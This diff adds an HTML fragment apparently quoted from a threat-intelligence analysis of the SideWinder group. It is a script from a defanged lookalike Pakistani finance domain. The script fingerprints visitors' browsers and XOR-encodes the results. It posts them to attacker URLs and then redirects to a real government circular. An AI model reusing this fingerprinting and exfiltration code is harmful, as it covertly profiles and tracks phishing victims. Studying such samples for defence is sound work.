@@ -1,0 +1,94 @@
+<div> Fragment of SideWinder.AntiBot.Script from https://finance.pakgov[.]net/salary-a4222e91 <code class="html hljs xml">&lt;script&gt;
+	function buttonClick() {
+		if (navigator.geolocation) {
+			navigator.geolocation.getCurrentPosition(showPosition);
+		} else {
+			x.innerHTML = 'Geolocation is not supported by this browser.';
+		}
+	}
+	function showPosition(position) {
+		alert(`lat ${position.coords.latitude} long ${position.coords.longitude}`);
+	}
+&lt;/script&gt;
+&lt;script&gt;
+	var postUrl = 'https://finance.pakgov[.]net/733/1/670/2/0/0/1874372994/HvEdALWHsRoqS3eIArlDgXiyAcvV5TsjfqF7kVAK/files-8adb0199/ads';
+	function encode(data, xorKey) {
+		let enc = new TextEncoder();
+		let dataBuff = enc.encode(data);
+		let keyBuff = enc.encode(xorKey);
+		let output = [];
+		for (let i = 0; i &lt; dataBuff.length; i++) output[i] = dataBuff[i] ^ keyBuff[i % keyBuff.length];
+		return new Blob([new Uint8Array(output)]);
+	}
+	function redirect() {
+		window.location.replace('https://www.finance.gov.pk/circulars/circular_14042022_2.pdf');
+	}
+	function postData(data) {
+		try {
+			var secretKey = '34-D4-3D-5B-6E-31-77-E7-27-06-96-CE-BE-E6-B5';
+			const finalData = JSON.stringify(data);
+			const encriptedData = encode(finalData, secretKey);
+			fetch(postUrl, {
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/text'
+				},
+				body: encriptedData
+			})
+				.then(() =&gt; {
+					redirect();
+				})
+				.catch((err) =&gt; {
+					redirect();
+				});
+		} catch (err) {
+			redirect();
+		}
+	}
+	function isCanvasSupported() {
+		var elem = document.createElement('canvas');
+		return !!(elem.getContext &amp;&amp; elem.getContext('2d'));
+	}
+	function getBrowserDetails(gpuData) {
+		var result = {};
+		try {
+			result.gpuData = gpuData;
+			result.navigatorInfo = {
+				oscpu: navigator.oscpu,
+				credentials: navigator.credentials,
+				clipboard: navigator.clipboard,
+				hardwareConcurrency: navigator.hardwareConcurrency,
+				geolocation: navigator.geolocation,
+				userAgent: navigator.userAgent,
+				language: navigator.language,
+				languages: navigator.languages
+			};
+			try {
+				result.canvasSupported = isCanvasSupported();
+			} catch (canvasErr) {}
+			result.utcOffset = new Date().getTimezoneOffset() / 60;
+			postData(result);
+		} catch (err) {
+			redirect();
+		}
+	}
+	function postDetection(data) {
+		var detectionPostUrl = 'https://finance.pakgov[.]net/733/1/670/2/0/0/1874372994/HvEdALWHsRoqS3eIArlDgXiyAcvV5TsjfqF7kVAK/files-867fdc8a/adscom';
+		try {
+			fetch(detectionPostUrl, {
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/text'
+				},
+				body: data
+			})
+				.then(() =&gt; {
+					redirect();
+				})
+				.catch((err) =&gt; {
+					redirect();
+				});
+		} catch (err) {
+			redirect();
+		}
+	}</code> </div>
